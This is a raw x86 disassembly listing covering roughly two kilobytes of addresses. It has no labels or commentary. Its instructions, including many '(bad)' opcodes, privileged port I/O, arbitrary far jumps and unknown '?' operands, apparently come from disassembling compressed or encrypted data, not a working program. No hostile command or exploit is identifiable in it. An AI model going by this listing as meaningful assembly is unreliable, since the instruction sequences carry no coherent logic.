  40801a:	rol    al,0x47
  40801d:	ret    
  40801e:	mov    edi,0xc2864140
  408023:	pop    ss
  408024:	cmp    al,0x83
  408026:	lock xor DWORD PTR [ebx+edi*2],0xffffff8b
  40802b:	call   FWORD PTR [edx+0x19]
  40802e:	std    
  40802f:	in     al,0x5e
  408031:	pop    ecx
  408032:	imul   edx,DWORD PTR [edi-0x32fd5c4d],0x8d7d61a6
  40803c:	add    eax,0xd1855d4f
  408041:	out    0xe,al
  408043:	push   esi
  408044:	pushf  
  408045:	jmp    0x7aa8:0x67fc36be
  40804c:	mov    dl,0x40
  40804e:	cmp    DWORD PTR [ecx],ecx
  408050:	adc    al,0x44
  408052:	dec    eax
  408053:	imul   DWORD PTR ds:0xf4b719f3
  408059:	ret    
  40805a:	dec    ebp
  40805b:	push   es
  40805c:	and    eax,0xb4aa9502
  408061:	das    
  408062:	push   0x13d2c394
  408067:	xor    bh,BYTE PTR [esi+0x4b85a9b]
  40806d:	lods   eax,DWORD PTR ds:[esi]
  40806e:	adc    al,0x9a
  408070:	lds    edi,FWORD PTR [edi-0xa]
  408073:	jbe    0x40802c
  408075:	xchg   esi,eax
  408076:	push   edx
  408077:	test   DWORD PTR [ebp+0x2],ecx
  40807a:	fisttp QWORD PTR [edx]
  40807c:	repnz rcl DWORD PTR ss:[edi+0x4c],0xf7
  408082:	aam    0x96
  408084:	stc    
  408085:	retf   0x19be
  408088:	jle    0x4080e1
  40808a:	(bad)
  40808d:	mov    bh,0x8c
  40808f:	call   0x42c7:0x6cfb9617
  408096:	fisub  DWORD PTR [edx]
  408098:	test   BYTE PTR [ebx+0x27],al
  40809b:	mov    al,0xd2
  40809d:	cmp    eax,0xc918a7a7
  4080a2:	inc    ebx
  4080a3:	int3   
  4080a4:	mov    DWORD PTR [eax],ebp
  4080a6:	sbb    al,0xeb
  4080a8:	ins    DWORD PTR es:[edi],dx
  4080a9:	into   
  4080aa:	mov    edi,0x37a7ed2
  4080af:	mov    ds:0xc836a2c3,eax
  4080b4:	xchg   DWORD PTR [edi+0x6],ecx
  4080b7:	adc    ebx,esp
  4080b9:	jbe    0x4080a3
  4080bb:	adc    bl,BYTE PTR ds:0x8c89a5c6
  4080c1:	inc    edi
  4080c2:	jb     0x408124
  4080c4:	add    al,0xe2
  4080c6:	enter  0xbe9c,0x7c
  4080ca:	cwde   
  4080cb:	into   
  4080cc:	mov    dh,0xb
  4080ce:	inc    esi
  4080cf:	call   0xd27:0x8bb66d2c
  4080d6:	jbe    0x4080cc
  4080d8:	sti    
  4080d9:	out    0x95,al
  4080db:	mov    ds:0x7a4a530b,eax
  4080e0:	push   eax
  4080e1:	clc    
  4080e2:	sti    
  4080e3:	into   
  4080e4:	(bad)  
  4080e5:	mov    ?,WORD PTR [ebp-0x45c1d705]
  4080eb:	rol    DWORD PTR [edx],0xba
  4080ee:	sbb    eax,0x8438f308
  4080f3:	pop    edi
  4080f4:	pop    edi
  4080f5:	mov    eax,ds:0xf9cba729
  4080fa:	mov    dl,0xd3
  4080fc:	pop    ebx
  4080fd:	xor    eax,0xfdfa26dd
  408102:	es pusha 
  408104:	mov    eax,esp
  408106:	pop    ds
  408107:	add    eax,0x9a94efba
  40810c:	push   cs
  40810d:	loop   0x40813e
  40810f:	call   0x50d4:0x69856560
  408116:	sbb    cl,0x26
  408119:	jno    0x4080fa
  40811b:	leave  
  40811c:	pop    esp
  40811d:	gs push ss
  40811f:	mov    eax,0x8998105c
  408124:	xor    dl,dh
  408126:	mov    eax,0xe1bfc261
  40812b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40812c:	mov    ss,esp
  40812e:	jmp    0x8ba081b1
  408133:	jle    0x408194
  408135:	pusha  
  408136:	lds    edi,FWORD PTR [eax]
  408138:	sahf   
  408139:	(bad)  
  40813a:	imul   edi,DWORD PTR [edx-0x3dc39710],0x251e074
  408144:	stos   DWORD PTR es:[edi],eax
  408145:	dec    ecx
  408146:	jbe    0x40815f
  408148:	bound  esi,QWORD PTR [edi-0x7d]
  40814b:	adc    DWORD PTR [edi],ecx
  40814d:	xor    al,0x97
  40814f:	icebp  
  408150:	sub    BYTE PTR [edx-0x20],dl
  408153:	stos   BYTE PTR es:[edi],al
  408154:	fimul  DWORD PTR [esi+0x68]
  408157:	sbb    dh,BYTE PTR [edi]
  408159:	stos   DWORD PTR es:[edi],eax
  40815a:	sbb    BYTE PTR [edi],0xd0
  40815d:	add    al,0xda
  40815f:	out    0x42,al
  408161:	add    dh,BYTE PTR [eax+0x7536a517]
  408167:	jo     0x40816d
  408169:	sub    dl,bl
  40816b:	das    
  40816c:	ret    0xb85a
  40816f:	pusha  
  408170:	xchg   ebp,eax
  408171:	pop    eax
  408172:	sbb    eax,0x8a49cd40
  408177:	inc    ebp
  408178:	pusha  
  408179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40817a:	dec    edx
  40817b:	out    dx,eax
  40817c:	adc    BYTE PTR [ebx+0x579afe6e],dl
  408182:	mov    ecx,0x4977fa93
  408187:	dec    eax
  408188:	xor    BYTE PTR [edi],0xc0
  40818b:	outs   dx,DWORD PTR ds:[esi]
  40818c:	stc    
  40818d:	test   al,0x7a
  40818f:	mov    ah,0x75
  408191:	in     eax,0x75
  408193:	inc    eax
  408194:	adc    al,0xb2
  408196:	into   
  408197:	cmp    esi,edi
  408199:	xor    DWORD PTR [edx+0x63d0a90c],esi
  40819f:	inc    esi
  4081a0:	inc    ebp
  4081a1:	lods   al,BYTE PTR ds:[esi]
  4081a2:	dec    eax
  4081a3:	imul   ebp,DWORD PTR [esi-0x49],0x3e588f9f
  4081aa:	dec    esp
  4081ab:	jl     0x40819d
  4081ad:	stos   DWORD PTR es:[edi],eax
  4081ae:	in     eax,dx
  4081af:	imul   ebp,DWORD PTR [ecx-0x3ed1cf29],0xa38c160
  4081b9:	outs   dx,DWORD PTR ds:[esi]
  4081ba:	adc    dl,BYTE PTR [edx]
  4081bc:	nop
  4081bd:	inc    edx
  4081be:	in     eax,0x24
  4081c0:	pop    eax
  4081c1:	cs xchg ch,al
  4081c4:	enter  0x4298,0x80
  4081c8:	daa    
  4081c9:	out    0x5,eax
  4081cb:	pop    eax
  4081cc:	das    
  4081cd:	jb     0x40824a
  4081cf:	(bad)  
  4081d0:	retf   0xd5f7
  4081d3:	ror    edx,cl
  4081d5:	cmp    BYTE PTR [ecx+0x3e],dl
  4081d8:	aad    0xd6
  4081da:	outs   dx,DWORD PTR ds:[esi]
  4081db:	mov    edx,0x213bc48b
  4081e0:	imul   ebp,edi,0x2b
  4081e3:	ins    DWORD PTR es:[edi],dx
  4081e4:	push   es
  4081e5:	retf   0x2a14
  4081e8:	in     al,dx
  4081e9:	xchg   ebx,eax
  4081ea:	xor    al,0x4b
  4081ec:	gs sahf 
  4081ee:	xchg   DWORD PTR [eax],ebx
  4081f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081f1:	or     al,0xb3
  4081f3:	(bad)  
  4081f4:	and    al,0x4c
  4081f6:	scas   eax,DWORD PTR es:[edi]
  4081f7:	rcl    ah,0x8c
  4081fa:	and    bl,BYTE PTR [ebp-0x9]
  4081fd:	fs sahf 
  4081ff:	stos   DWORD PTR es:[edi],eax
  408200:	outs   dx,BYTE PTR ds:[esi]
  408201:	push   edx
  408202:	sub    BYTE PTR [edx+eax*8],bl
  408205:	cmp    bl,BYTE PTR [ebp+0x20c54b25]
  40820b:	lahf   
  40820c:	xor    bh,BYTE PTR [ecx+0x25]
  40820f:	mov    ds:0x2d250676,al
  408214:	rcr    DWORD PTR [ecx+0x5c],cl
  408217:	int    0x77
  408219:	ins    BYTE PTR es:[edi],dx
  40821a:	aas    
  40821b:	in     eax,0x8c
  40821d:	std    
  40821e:	push   edx
  40821f:	pop    es
  408220:	pop    edi
  408221:	mov    ecx,0xc14b6c33
  408226:	loop   0x408207
  408228:	fwait
  408229:	push   eax
  40822a:	fs or  al,0xbb
  40822d:	or     bh,BYTE PTR [ebp+0x51e9ce4b]
  408233:	fild   QWORD PTR [edx]
  408235:	xchg   ebp,ecx
  408237:	inc    eax
  408238:	mov    eax,0x3b076aef
  40823d:	ret    
  40823e:	lock addr16 pop ds
  408241:	dec    ebx
  408242:	fadd   QWORD PTR [edx]
  408244:	dec    eax
  408245:	(bad)  
  408246:	scas   eax,DWORD PTR es:[edi]
  408247:	mov    esi,0x6e55eeba
  40824c:	pop    ds
  40824d:	les    ebp,FWORD PTR [edi+0x2eab709b]
  408253:	sbb    eax,0x6fc290fa
  408258:	jnp    0x40823b
  40825a:	stc    
  40825b:	lods   al,BYTE PTR ds:[esi]
  40825c:	enter  0x1fea,0x3f
  408260:	aad    0x36
  408262:	mov    edx,0x5a74d410
  408267:	lea    edx,[ecx]
  408269:	and    bh,dl
  40826b:	or     ebx,DWORD PTR [edi+0x3b956242]
  408271:	inc    ebp
  408272:	fcomi  st,st(1)
  408274:	cmc    
  408275:	fdivr  st(0),st
  408277:	int    0x99
  408279:	and    eax,0xda012065
  40827e:	data16 (bad) 
  408280:	sbb    eax,0xe0ab9c69
  408285:	cli    
  408286:	sub    DWORD PTR [eax],edx
  408288:	aas    
  408289:	inc    eax
  40828a:	popf   
  40828b:	dec    esp
  40828c:	xchg   esp,eax
  40828d:	cmc    
  40828e:	(bad)  
  40828f:	std    
  408290:	push   eax
  408291:	adc    ch,BYTE PTR [eax-0x5]
  408294:	xchg   ecx,eax
  408295:	in     al,0x2b
  408297:	sbb    ebx,eax
  408299:	jg     0x40821b
  40829b:	in     eax,0x94
  40829d:	(bad)  
  40829e:	pop    ecx
  40829f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082a0:	test   eax,0x4c527ba8
  4082a5:	into   
  4082a6:	cli    
  4082a7:	fistp  WORD PTR [eax]
  4082a9:	and    BYTE PTR [ebx-0x4b],ch
  4082ac:	and    BYTE PTR [ecx+eiz*1-0x64],dl
  4082b0:	xor    ebp,DWORD PTR [ebp-0x1a5b0771]
  4082b6:	adc    BYTE PTR [ebx+0x1a0d10f3],0x6a
  4082bd:	adc    DWORD PTR [ecx],0xe15aaf61
  4082c3:	mov    bl,0x44
  4082c5:	xchg   ecx,eax
  4082c6:	sub    eax,0x1caf8606
  4082cb:	push   ebx
  4082cc:	gs cdq 
  4082ce:	popf   
  4082cf:	(bad)  
  4082d0:	sub    BYTE PTR [ecx+0x6badb706],ch
  4082d6:	loopne 0x408348
  4082d8:	ror    DWORD PTR [esi+0x7bf8028e],0xbb
  4082df:	iret   
  4082e0:	iret   
  4082e1:	nop
  4082e2:	retf   0x9a6c
  4082e5:	xor    BYTE PTR [edx],bh
  4082e7:	mov    al,ds:0xf26f4de5
  4082ec:	xchg   edi,eax
  4082ed:	aad    0x1b
  4082ef:	mov    ebp,0xc424a9a5
  4082f4:	test   eax,0x5677dadf
  4082f9:	add    edx,DWORD PTR [ebx+0x75]
  4082fc:	add    edx,DWORD PTR [edi]
  4082fe:	inc    eax
  4082ff:	sub    ebx,eax
  408301:	std    
  408302:	out    dx,eax
  408303:	jno    0x408341
  408305:	pop    ebx
  408306:	lds    esi,FWORD PTR [ebp-0x3d]
  408309:	mov    ds:0x1630c7e0,eax
  40830e:	cld    
  40830f:	xor    esi,DWORD PTR [esi+0x6d11e5f4]
  408315:	hlt    
  408316:	mov    ebx,0x322d9c00
  40831b:	xor    ch,BYTE PTR [ebx-0x730f0f51]
  408321:	and    DWORD PTR [ecx-0x74],ebp
  408324:	adc    DWORD PTR [eax],ebx
  408326:	stos   DWORD PTR es:[edi],eax
  408327:	aaa    
  408328:	mov    edx,0x1a06b844
  40832d:	fs das 
  40832f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408330:	sub    BYTE PTR [ebx-0x24],ch
  408333:	and    eax,0x62ee7e4e
  408338:	pop    esi
  408339:	or     bl,dl
  40833b:	aam    0xbd
  40833d:	dec    esi
  40833e:	stos   DWORD PTR es:[edi],eax
  40833f:	fdivr  QWORD PTR [edx-0x31d2738e]
  408345:	clc    
  408346:	mov    ebp,0xc4318188
  40834b:	mov    esp,0x81788265
  408350:	xchg   esi,eax
  408351:	pop    edi
  408352:	popa   
  408353:	and    dh,dl
  408355:	push   edi
  408356:	daa    
  408357:	and    DWORD PTR [edx+eax*4],esi
  40835a:	in     eax,0x64
  40835c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40835d:	es mov bh,0xae
  408360:	(bad)  
  408361:	loope  0x408399
  408363:	cmc    
  408364:	ss into 
  408366:	add    al,0xb8
  408368:	scas   al,BYTE PTR es:[edi]
  408369:	inc    esp
  40836a:	pop    esp
  40836b:	mov    cl,0xeb
  40836d:	ror    dh,1
  40836f:	ja     0x4083b7
  408371:	inc    esi
  408372:	mov    al,0xd9
  408374:	pop    ss
  408375:	mov    esp,DWORD PTR [ecx]
  408377:	inc    esp
  408378:	push   ebx
  408379:	pushw  ds
  40837b:	add    cl,BYTE PTR [ebx+ebx*4+0x7da841df]
  408382:	hlt    
  408383:	push   ecx
  408384:	mov    ebp,esp
  408386:	imul   ebx,esp,0x55
  408389:	loope  0x4083a9
  40838b:	push   ecx
  40838c:	cmc    
  40838d:	cmc    
  40838e:	mov    ds:0xee5f5eac,al
  408393:	inc    ebx
  408394:	push   esp
  408395:	mov    edi,0xaa4934fc
  40839a:	rcr    BYTE PTR [esi],cl
  40839c:	push   ebx
  40839d:	or     edx,eax
  40839f:	or     DWORD PTR [eax],eax
  4083a1:	xor    DWORD PTR [ecx+0x3f039f43],eax
  4083a7:	test   al,0xa8
  4083a9:	mov    WORD PTR [edi-0x35],?
  4083ac:	sar    DWORD PTR [esi-0x53],cl
  4083af:	sbb    bl,cl
  4083b1:	and    eax,0xf7444212
  4083b6:	dec    ebx
  4083b7:	mov    esp,0xb8d0fedc
  4083bc:	xor    BYTE PTR [edi+0x24],cl
  4083bf:	ret    0x6a8d
  4083c2:	push   eax
  4083c3:	out    dx,al
  4083c4:	and    DWORD PTR [eax],ebp
  4083c6:	mov    DWORD PTR [eax+0x55],0x78432e6
  4083cd:	sahf   
  4083ce:	or     eax,0x69f39890
  4083d3:	jg     0x408363
  4083d5:	sti    
  4083d6:	mov    WORD PTR [ecx+0x2],ss
  4083d9:	mov    ecx,0x549c25c3
  4083de:	hlt    
  4083df:	mov    ecx,0xcf825823
  4083e4:	xchg   esi,eax
  4083e5:	call   0xdfc989df
  4083ea:	pop    esi
  4083eb:	pushf  
  4083ec:	(bad)  
  4083ed:	pop    ss
  4083ee:	out    dx,eax
  4083ef:	jge    0x408416
  4083f1:	sub    BYTE PTR [eax],0x2d
  4083f4:	scas   al,BYTE PTR es:[edi]
  4083f5:	(bad)
  4083f9:	sbb    eax,0x6b582f83
  4083fe:	mov    esi,0xc2029b1a
  408403:	popa   
  408404:	shl    BYTE PTR [eax-0x73],cl
  408407:	lods   al,BYTE PTR ds:[esi]
  408408:	push   esp
  408409:	sub    BYTE PTR [esi],dh
  40840b:	sub    edx,DWORD PTR [edx]
  40840d:	add    BYTE PTR [ecx-0x1954f44e],bl
  408413:	mov    edx,esp
  408415:	and    al,0xb9
  408417:	jnp    0x408446
  408419:	loop   0x408471
  40841b:	cmp    BYTE PTR ds:0x3dccd35a,dl
  408421:	neg    DWORD PTR [eax+0x3673dbf6]
  408427:	aam    0xe
  408429:	xchg   DWORD PTR [ebp-0x410c4c17],esi
  40842f:	jecxz  0x408489
  408431:	jb     0x40846d
  408433:	pop    edx
  408434:	jo     0x408403
  408436:	and    DWORD PTR [eax+0x43fcecba],ecx
  40843c:	ins    DWORD PTR es:[edi],dx
  40843d:	test   ah,ah
  40843f:	pop    ebp
  408440:	sahf   
  408441:	bound  ecx,QWORD PTR [eax+eiz*1+0x72332a8c]
  408448:	mov    ebp,0xcd090768
  40844d:	xor    dh,ah
  40844f:	stos   BYTE PTR es:[edi],al
  408450:	es xchg ebp,eax
  408452:	jmp    0x7b8a:0x4457532
  408459:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40845a:	push   ecx
  40845b:	test   eax,0x8d2e4b0a
  408460:	jb     0x408413
  408462:	(bad)  
  408463:	pop    ebp
  408464:	icebp  
  408465:	inc    esi
  408466:	pop    es
  408467:	add    DWORD PTR [ebp-0x69],ebx
  40846a:	mov    esp,0x537f5d47
  40846f:	or     DWORD PTR [ebx+0xb],ebp
  408472:	inc    edx
  408473:	and    eax,edi
  408475:	imul   ecx,edx,0x9251df4e
  40847b:	(bad)  
  40847c:	xchg   ebp,eax
  40847d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40847e:	dec    ebx
  40847f:	retf   0x959a
  408482:	jno    0x4084a7
  408484:	bound  ecx,QWORD PTR [edx+ebx*8]
  408487:	aam    0xc4
  408489:	and    ch,BYTE PTR [edx+esi*8]
  40848c:	sub    BYTE PTR [esi+edi*8+0x1185848d],bh
  408493:	scas   al,BYTE PTR es:[edi]
  408494:	les    esp,FWORD PTR [edx]
  408496:	fisub  WORD PTR [edx]
  408498:	fisttp QWORD PTR [edi+0x357f737c]
  40849e:	(bad)  
  40849f:	xlat   BYTE PTR ds:[ebx]
  4084a0:	mov    BYTE PTR [eax+0x39],al
  4084a3:	pop    ss
  4084a4:	dec    edx
  4084a5:	cmp    eax,edx
  4084a7:	dec    eax
  4084a8:	adc    BYTE PTR ds:0x25ba65ef,bl
  4084ae:	aas    
  4084af:	aam    0x9e
  4084b1:	inc    edi
  4084b2:	and    edi,ecx
  4084b4:	inc    esp
  4084b5:	outs   dx,DWORD PTR ds:[esi]
  4084b6:	sbb    al,0xb2
  4084b8:	fistp  DWORD PTR [eax]
  4084ba:	fcomp  DWORD PTR [ecx-0x3af92f45]
  4084c0:	mov    DWORD PTR [esi-0x40],eax
  4084c3:	icebp  
  4084c4:	pop    edx
  4084c5:	shl    DWORD PTR [edx+0x31],0x31
  4084c9:	add    esi,DWORD PTR [ebp+ebx*8-0x24190ec4]
  4084d0:	lods   al,BYTE PTR ds:[esi]
  4084d1:	sar    BYTE PTR [eax+0x1e9ea10a],1
  4084d7:	push   0x61
  4084d9:	test   BYTE PTR [ebx-0x19],dh
  4084dc:	push   eax
  4084dd:	push   ss
  4084de:	or     eax,0x88fb9a87
  4084e3:	pop    ds
  4084e4:	stc    
  4084e5:	in     al,dx
  4084e6:	pop    esp
  4084e7:	enter  0x4b02,0xc0
  4084eb:	das    
  4084ec:	adc    eax,0x9c64eaa9
  4084f1:	dec    esi
  4084f2:	(bad)  
  4084f3:	mov    ds:0xd3abda1,al
  4084f8:	mov    al,ds:0x72ecd9ba
  4084fd:	or     esi,DWORD PTR [edx-0x7a]
  408500:	popf   
  408501:	into   
  408502:	fidivr WORD PTR [ecx+ebp*4]
  408505:	mov    ebp,0x9b18a8d7
  40850a:	loopne 0x408496
  40850c:	cli    
  40850d:	cwde   
  40850e:	iret   
  40850f:	call   0xa756bf5e
  408514:	and    bl,BYTE PTR [bx-0x20]
  408518:	pop    edi
  408519:	(bad)  
  40851a:	jb     0x4084ed
  40851c:	xlat   BYTE PTR ds:[ebx]
  40851d:	outs   dx,DWORD PTR ds:[esi]
  40851e:	push   0xffffffff
  408520:	dec    edx
  408521:	rol    DWORD PTR [esi],0x58
  408524:	mov    BYTE PTR [edx],ch
  408526:	xchg   ebx,eax
  408527:	lods   eax,DWORD PTR ds:[esi]
  408528:	out    dx,eax
  408529:	fiadd  WORD PTR [ecx]
  40852b:	mov    ebx,0xb07b61a1
  408530:	xchg   ebx,eax
  408531:	mov    edx,0xb5f84cd6
  408536:	inc    esp
  408537:	mov    dh,0x5a
  408539:	test   al,0x8b
  40853b:	sar    BYTE PTR [ecx],0x2c
  40853e:	push   eax
  40853f:	imul   esp,eax,0x7d6c709f
  408545:	mov    eax,ds:0xdc8cbda8
  40854a:	jb     0x4084e9
  40854c:	in     al,0x93
  40854e:	mov    ch,0x85
  408550:	inc    esi
  408551:	(bad)  
  408552:	bound  ebp,QWORD PTR [ecx-0x22dac43]
  408558:	mov    edi,0x5990ce8b
  40855d:	and    eax,0x71b70f83
  408562:	mov    dl,0x72
  408564:	fs push 0x55c5707e
  40856a:	stos   BYTE PTR es:[edi],al
  40856b:	mov    bh,0x2d
  40856d:	loopne 0x408547
  40856f:	les    eax,FWORD PTR [edx]
  408571:	jmp    0x8130:0x8adb8eb9
  408578:	xor    eax,0xe02db99d
  40857d:	imul   DWORD PTR [esi+edi*8+0x2683a0d6]
  408584:	jl     0x4085a0
  408586:	aas    
  408587:	mov    esi,0x9123ade8
  40858c:	arpl   WORD PTR [edx],sp
  40858e:	shl    DWORD PTR [esp+ebx*8-0x6c],1
  408592:	sbb    al,BYTE PTR [ebp-0x5177c743]
  408598:	sub    bh,ah
  40859a:	pop    eax
  40859b:	mov    ds:0x17306468,al
  4085a0:	fidiv  DWORD PTR [edx+0x57]
  4085a3:	call   0xd6305955
  4085a8:	xor    bh,BYTE PTR [ebp-0x29]
  4085ab:	sub    esp,ebp
  4085ad:	xchg   ebp,eax
  4085ae:	or     ch,BYTE PTR gs:[ebx]
  4085b1:	pop    eax
  4085b2:	jb     0x4085e6
  4085b4:	pushf  
  4085b5:	loop   0x40859b
  4085b7:	hlt    
  4085b8:	add    dh,BYTE PTR [edx-0x5bc9b4be]
  4085be:	aas    
  4085bf:	jl     0x40862f
  4085c1:	popf   
  4085c2:	fwait
  4085c3:	lea    esi,[edi]
  4085c5:	inc    edi
  4085c6:	daa    
  4085c7:	mov    ch,0x7c
  4085c9:	sbb    eax,0x6c07b4c7
  4085ce:	loopne 0x4085fd
  4085d0:	dec    edi
  4085d1:	sub    DWORD PTR [edx-0x13],ecx
  4085d4:	push   ebp
  4085d5:	adc    cl,BYTE PTR [edi-0xbba3804]
  4085db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085dc:	test   DWORD PTR [eax+edi*8-0x1603ba75],ebx
  4085e3:	stos   BYTE PTR es:[edi],al
  4085e4:	and    eax,DWORD PTR [eax]
  4085e6:	add    BYTE PTR ds:0x84488431,bl
  4085ec:	les    ebx,FWORD PTR [ebp+0xc292524]
  4085f2:	push   0xffffff9d
  4085f4:	push   edi
  4085f5:	dec    ebx
  4085f6:	push   edx
  4085f7:	jns    0x408612
  4085f9:	add    DWORD PTR [ebx-0x7c7c9f0f],0x3d
  408600:	popf   
  408601:	jmp    FWORD PTR [ebp-0x73e28429]
  408607:	hlt    
  408608:	add    al,0x3
  40860a:	rcl    DWORD PTR [ecx-0x51],cl
  40860d:	retf   0x1178
  408610:	cmp    al,0x3e
  408612:	out    dx,al
  408613:	retf   0xe6af
  408616:	mov    eax,0x6d05b392
  40861b:	loopne 0x40869a
  40861d:	std    
  40861e:	inc    edx
  40861f:	inc    edi
  408620:	cmovg  eax,DWORD PTR [edi-0x5a02c637]
  408627:	xor    DWORD PTR [edx+0x31],ecx
  40862a:	icebp  
  40862b:	pop    ss
  40862c:	(bad)  
  40862d:	xor    ch,BYTE PTR [esi+0x7f576ab3]
  408633:	inc    ebp
  408634:	adc    eax,edx
  408636:	test   al,0xb8
  408638:	pop    esi
  408639:	lods   al,BYTE PTR ds:[esi]
  40863a:	ja     0x4085cf
  40863c:	sub    al,0x46
  40863e:	push   ebp
  40863f:	and    BYTE PTR [esi],bh
  408641:	jmp    0xcc9986d5
  408646:	(bad)  
  408647:	jg     0x40862b
  408649:	pusha  
  40864a:	into   
  40864b:	clc    
  40864c:	aam    0x99
  40864e:	mov    cl,0xdc
  408650:	mov    bh,0xd2
  408652:	jp     0x408692
  408654:	pushf  
  408655:	repnz int 0x3a
  408658:	ja     0x408681
  40865a:	push   0xffffff85
  40865c:	sbb    eax,0x7347173b
  408661:	imul   ecx,ebp,0x47
  408664:	sub    eax,0xc33eb268
  408669:	icebp  
  40866a:	mov    DWORD PTR [ebx],0x75165bd5
  408670:	xor    esi,ebx
  408672:	xlat   BYTE PTR ds:[ebx]
  408673:	sub    eax,0x8fa10e10
  408678:	pop    ebx
  408679:	popf   
  40867a:	add    DWORD PTR [ebp-0x46],eax
  40867d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40867e:	push   esp
  40867f:	int    0xe
  408681:	jb     0x408628
  408683:	sub    BYTE PTR [eax],bl
  408685:	in     eax,dx
  408686:	rol    DWORD PTR [ecx+eax*1],cl
  408689:	xchg   edi,eax
  40868a:	shl    DWORD PTR [esi+eiz*2],0xc1
  40868e:	push   ecx
  40868f:	pop    ebp
  408690:	aas    
  408691:	hlt    
  408692:	jnp    0x4086b2
  408694:	je     0x408661
  408696:	mov    es,WORD PTR [ebp-0x3c]
  408699:	nop
  40869a:	pop    ebx
  40869b:	inc    ecx
  40869c:	push   eax
  40869d:	sete   BYTE PTR [edx+eax*4+0xcd31d8c]
  4086a5:	jnp    0x408631
  4086a7:	inc    ebp
  4086a8:	add    al,0x9
  4086aa:	(bad)  
  4086ab:	push   ecx
  4086ac:	or     al,0xcc
  4086ae:	push   ss
  4086af:	pushf  
  4086b0:	xor    BYTE PTR [esi+ebp*2],dh
  4086b3:	sub    edi,esp
  4086b5:	cdq    
  4086b6:	xchg   ebx,eax
  4086b7:	sub    dl,cl
  4086b9:	(bad)  
  4086ba:	div    BYTE PTR [ebx+0x4e]
  4086bd:	xlat   BYTE PTR es:[ebx]
  4086bf:	dec    ebx
  4086c0:	push   eax
  4086c1:	fcmovbe st,st(5)
  4086c3:	add    BYTE PTR [esi+0x55],bl
  4086c6:	jo     0x408695
  4086c8:	mov    edi,ebp
  4086ca:	inc    edi
  4086cb:	cld    
  4086cc:	inc    eax
  4086cd:	retf   0x5136
  4086d0:	popf   
  4086d1:	xor    esp,ecx
  4086d3:	sbb    BYTE PTR [esi],ch
  4086d5:	add    BYTE PTR [ecx-0x79],ch
  4086d8:	or     eax,0xbd49a764
  4086dd:	call   0xa3f:0xebb8a142
  4086e4:	mov    eax,0xdedbb65b
  4086e9:	test   edx,edi
  4086eb:	iret   
  4086ec:	scas   al,BYTE PTR es:[edi]
  4086ed:	imul   DWORD PTR [ebx-0x71]
  4086f0:	(bad)  
  4086f1:	lahf   
  4086f2:	mov    ds:0xd9e5c61b,al
  4086f7:	xor    BYTE PTR [ebp+0x64],dl
  4086fa:	mov    eax,eax
  4086fc:	jecxz  0x408758
  4086fe:	jl     0x4086fc
  408700:	lock nop
  408702:	add    DWORD PTR [ebx-0x56],0x58
  408706:	cs inc edx
  408708:	sbb    eax,0x93cf1c96
  40870d:	cmp    ah,BYTE PTR [edi-0x21]
  408710:	stos   BYTE PTR es:[edi],al
  408711:	hlt    
  408712:	stos   DWORD PTR es:[edi],eax
  408713:	imul   edx,DWORD PTR [ebx],0xc
  408716:	mov    bl,0x7d
  408718:	in     al,0xa7
  40871a:	mov    gs,ecx
  40871c:	ins    BYTE PTR es:[edi],dx
  40871d:	add    al,0xf6
  40871f:	mov    DWORD PTR [edi],0xcab5c013
  408725:	xchg   ecx,eax
  408726:	mov    esi,0x44f29e6e
  40872b:	xor    edx,DWORD PTR [edi-0x7ae1323]
  408731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408732:	lods   eax,DWORD PTR ds:[esi]
  408733:	push   ebp
  408734:	jmp    0x4087b2
  408736:	shl    DWORD PTR [edi-0x5],cl
  408739:	test   eax,0xe1bd4fb8
  40873e:	or     BYTE PTR [ebx+0x79ef2290],al
  408744:	xchg   DWORD PTR [ebp+0x1ddfc4f9],ecx
  40874a:	stos   BYTE PTR es:[edi],al
  40874b:	lock gs cmp al,0xa
  40874f:	xor    DWORD PTR [eax+0x38],esp
  408752:	out    dx,eax
  408753:	mov    dl,0x5e
  408755:	jg     0x4086ee
  408757:	test   BYTE PTR [edi-0xcf82707],dl
  40875d:	dec    esp
  40875e:	ja     0x40878b
  408760:	dec    esi
  408761:	stos   DWORD PTR es:[edi],eax
  408762:	add    al,0x48
  408764:	ss out dx,eax
  408766:	hlt    
  408767:	adc    bh,bh
  408769:	or     al,0xe8
  40876b:	and    eax,esp
  40876d:	fwait
  40876e:	xchg   ecx,eax
  40876f:	and    ebp,ebx
  408771:	ret    
  408772:	inc    ecx
  408773:	cwde   
  408774:	shr    DWORD PTR [ebx+eiz*8],cl
  408777:	test   eax,0x13a663d
  40877c:	add    eax,0xa7c09b46
  408781:	xchg   edi,eax
  408782:	pop    ecx
  408783:	retf   0x4b9e
  408786:	jecxz  0x408733
  408788:	cmp    eax,0x4d2d2f1f
  40878d:	cmp    esi,eax
  40878f:	out    dx,al
  408790:	mov    ds:0x9c735b70,eax
  408795:	popa   
  408796:	and    BYTE PTR [ebp+esi*8+0x5c],cl
  40879a:	cmp    DWORD PTR [eax+0x76],esi
  40879d:	dec    eax
  40879e:	aad    0x7c
  4087a0:	imul   DWORD PTR [edx+0x16ad511a]
  4087a6:	mov    ebp,0x466e061f
  4087ab:	sub    al,BYTE PTR [ecx]
  4087ad:	cld    
  4087ae:	clc    
  4087af:	mov    ch,0x21
  4087b1:	sub    dh,BYTE PTR [eax+0x3f]
  4087b4:	and    edi,DWORD PTR [ebp-0x54d0e715]
  4087ba:	dec    eax
  4087bb:	xchg   ecx,eax
  4087bc:	mov    dh,0x21
  4087be:	call   0x6d3b598
  4087c3:	mov    al,0x64
  4087c5:	xchg   ebx,eax
  4087c6:	and    ah,BYTE PTR [ecx+0x36]
  4087c9:	jnp    0x4087a1
  4087cb:	and    edx,esp
  4087cd:	dec    esp
  4087ce:	mov    edx,0x31c867a4
  4087d3:	xchg   ebx,eax
  4087d4:	iret   
  4087d5:	xchg   ebx,eax
  4087d6:	push   ss
  4087d7:	mov    ecx,DWORD PTR [esi-0x79]
  4087da:	and    esi,esi
